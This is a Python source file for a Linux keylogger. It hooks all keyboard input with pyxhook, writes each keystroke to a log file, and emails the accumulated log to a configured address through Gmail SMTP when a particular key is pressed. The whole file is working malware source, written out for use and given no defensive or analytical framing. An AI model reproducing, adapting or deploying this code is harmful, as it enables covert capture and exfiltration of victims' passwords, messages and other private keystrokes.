__author__ = "IrrelevantPenguin"
# Inspired by https://github.com/WilsonKoder111/PieLogger

import sys, time,os
import smtplib
import pyxhook # This is the linux version of pyhook

class pyLogger(object):
    def __init__(self,smtp_server, username, password, from_addr,to_addr, email_body, log_file_path):
        # Email config
        self.smtp_server = smtp_server
        self.username = username
        self.password = password
        self.from_addr = from_addr
        self.to_addr = to_addr
        self.email_body = email_body

        self.log_file_path = log_file_path

    def key_pressed(self,event):
        with open(self.log_file_path, "a") as log_file: # Save all the key presses in a file
            log_file.write(chr(event.Ascii))
        with open(self.log_file_path, "r") as file_to_read: # Use the log file as the email body
            self.email_body =  '"' + str(file_to_read.read()) + '"'
        if event.Ascii == 0: # If backspace is pressed then send an email
            self.send_email(self.username, self.password, self.from_addr, self.to_addr, self.email_body)

    def send_email(self,username, password, from_addr, to_addr, email_body):
        server = smtplib.SMTP(self.smtp_server)
        server.starttls()
        server.login(self.username,self.password)
        server.sendmail(self.from_addr,self.to_addr,self.email_body)

def main():
    logger = pyLogger('smtp.gmail.com:587',"email@address.com", "password", "email@address.com", "email@address.com", "", "/path/to/log.txt")
    # Set up the Hooks to detect Key Down events
    hook_manager = pyxhook.HookManager()
    hook_manager.KeyDown = logger.key_pressed # connect the KeyDown event to our function
    hook_manager.HookKeyboard()
    hook_manager.start()

    running = True
    while running: # Create a loop so the program doesn't close
        time.sleep(0.1)

    hook_manager.cancel()

if __name__ == "__main__":
    main()
